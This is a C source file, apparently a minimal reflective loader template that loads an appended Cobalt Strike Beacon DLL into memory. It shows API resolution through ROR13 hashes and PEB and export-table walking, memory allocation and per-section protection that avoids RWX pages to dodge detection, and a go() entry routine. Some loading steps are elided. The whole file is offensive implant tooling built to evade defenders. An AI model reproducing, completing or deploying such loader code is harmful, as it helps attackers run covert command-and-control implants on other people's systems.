/*
 * Crystal Palace UDRL — Loader Entry Point
 *
 * Minimal Crystal Palace loader implementation demonstrating:
 *   - Dynamic Function Resolution (DFR) via ROR13 hashes
 *   - Appended-resource pattern for delivering the Beacon DLL
 *   - Per-section memory protection (no RWX)
 *
 * DFR references are declared using the MODULE$Function naming pattern.
 * Crystal Palace generates ROR13 hashes at link time and rewrites call
 * sites to dispatch through the operator-supplied resolve() function.
 */

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

FARPROC resolve(DWORD mod_hash, DWORD func_hash) {
    HANDLE module = findModuleByHash(mod_hash);       // walks PEB InMemoryOrderModuleList
    return findFunctionByHash(module, func_hash);      // walks EAT
}

/* Appended resource markers — zero-byte sections linked by the spec file */
char _DLL_[0] __attribute__((section("dll")));

#define GETRESOURCE(x) ((char*)&x)

/*
 * fix_section_permissions — Walk PE section headers and apply the
 * correct final protection to each section via VirtualProtect.
 *
 *   .text  — PAGE_EXECUTE_READ
 *   .data  — PAGE_READWRITE
 *   .rdata — PAGE_READONLY
 */
void fix_section_permissions(DLLDATA *dll, char *src, char *dst) {
    DWORD count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER *hdr = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
        dll->OptionalHeader,
        dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < count; i++) {
        void *sec_dst  = dst + hdr->VirtualAddress;
        DWORD sec_size = hdr->SizeOfRawData;
        DWORD new_prot = PAGE_READONLY, old_prot = 0;

        if (hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) new_prot = PAGE_EXECUTE_READ;
        else if (hdr->Characteristics & IMAGE_SCN_MEM_WRITE) new_prot = PAGE_READWRITE;

        KERNEL32$VirtualProtect(sec_dst, sec_size, new_prot, &old_prot);
        hdr++;
    }
}

void go() {
    char *dll_src = GETRESOURCE(_DLL_);   // pointer to appended Beacon DLL

    /* Allocate as RW — never RWX */
    char *dll_dst = KERNEL32$VirtualAlloc(NULL, SizeOfDLL(&dll_data),
        MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);

    /* ... copy sections, process relocations, resolve imports ... */

    /* Apply correct per-section protections */
    fix_section_permissions(&dll_data, dll_src, dll_dst);

    /* ... invoke DLL entry point ... */
}
